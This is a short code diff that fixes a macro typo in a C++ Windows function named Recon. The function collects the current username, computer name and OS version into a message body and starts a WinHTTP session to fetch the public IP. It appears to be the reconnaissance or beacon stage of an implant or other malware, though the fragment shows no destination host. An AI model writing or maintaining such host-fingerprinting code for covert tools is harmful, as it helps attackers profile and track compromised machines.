@@ -373,7 +373,7 @@ static void Recon() {
     GetEnvironmentVariableW(L"COMPUTERNAME", comp, 256);
     std::string body = std::string("user: ") + ToStr(std::vector<BYTE>((BYTE*)user, (BYTE*)user + wcslen(user) * 2)) +
                        "\npc: " + ToStr(std::vector<BYTE>((BYTE*)comp, (BYTE*)comp + wcslen(comp) * 2)) +
-                       "\nos: Windows " + std::to_string(_WIN32_WIN32);
+                       "\nos: Windows " + std::to_string(_WIN32_WINNT);
 
     // Get public IP via webfetch (simple)
     HINTERNET hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
